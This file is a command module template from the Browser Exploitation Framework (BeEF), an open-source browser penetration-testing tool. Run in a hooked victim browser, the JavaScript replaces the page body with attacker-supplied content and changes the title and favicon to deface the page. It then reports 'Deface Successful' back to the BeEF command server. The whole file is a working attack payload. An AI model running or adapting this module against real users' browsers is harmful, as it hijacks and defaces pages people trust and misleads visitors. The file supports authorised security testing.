//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
	document.body.innerHTML = decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@deface_content) %>'));
	document.title = "<%= @deface_title %>";
	beef.browser.changeFavicon("<%= @deface_favicon %>");

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Deface Successful", beef.are.status_success());
});
